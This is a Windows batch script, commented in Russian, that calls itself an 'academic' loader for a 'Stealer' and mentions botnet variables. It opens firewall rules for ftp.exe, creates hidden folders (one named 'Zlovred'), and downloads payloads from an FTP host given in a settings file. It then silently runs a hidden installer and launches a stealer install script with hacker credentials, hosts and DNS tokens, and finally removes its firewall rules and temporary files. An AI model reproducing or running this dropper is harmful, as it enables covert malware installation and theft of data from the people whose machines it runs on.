rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > load_ftpStyler.bat
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem Обновляем перемсенные окружения
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Create Windows Firewall Rules
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="FTP.EXE Application rule 1" dir=out action=allow program="%windir%\system32\ftp.exe" enable=yes

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

::Временный файл команд для утилиты FTP.exe
set CommFTP="%TEMP%\Initial_Script.txt"


rem Определяем переменные:
rem FTP Host
set host=%ftphost%
rem FTP Port
rem set ftpport=21
rem Ftp user
rem set ftpuser=anonymous
rem FTP Password
rem set ftppassword=
rem Основная папка
rem set ftpMainFolder=
rem Папка внутри FTP архива
rem set ftpSubFolder=Exponenta
rem Папка внутри FTP архива
rem set ftpSubFolder1=
rem Маска для файлов
rem set ftpFileMask=*
rem Локальный каталог
set LocalFolderZ=%PUB1%\Distrib\Zlovred

rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
del /Q /F %LocalFolderZ%\*.*

::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %ftpport%
  echo %ftpuser%
  echo.%ftppassword%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolderZ%"
  if "%ftpMainFolder%" neq "" echo cd "%ftpMainFolder%"
  if "%ftpSubFolder%" neq "" echo cd "%ftpSubFolder%"
  if "%ftpSubFolder1%" neq "" echo cd "%ftpSubFolder1%"
  echo mget %ftpFileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

%windir%\system32\ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
rem copy wget.exe %LocalFolderZ%\wget.exe
rem copy ExponentaInstallerFtpHidden.exe %LocalFolderZ%\ExponentaInstallerFtpHidden.exe
rem copy install_Styler.ini %LocalFolderZ%\
rem copy installFTP_Stylerdistrib.bat %LocalFolderZ%\
rem copy Install_StylerFTP.bat %LocalFolderZ%\

rem Запускаем инсталлятор Admin-Pack "Экспонента"
%LocalFolderZ%\nit-install-hidden.exe

rem Запускаем инсталлятор Stealer "Экспонента"
call %LocalFolderZ%\install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Уджаляем правила для брандмауэра
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="FTP.EXE Application rule 1"

rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

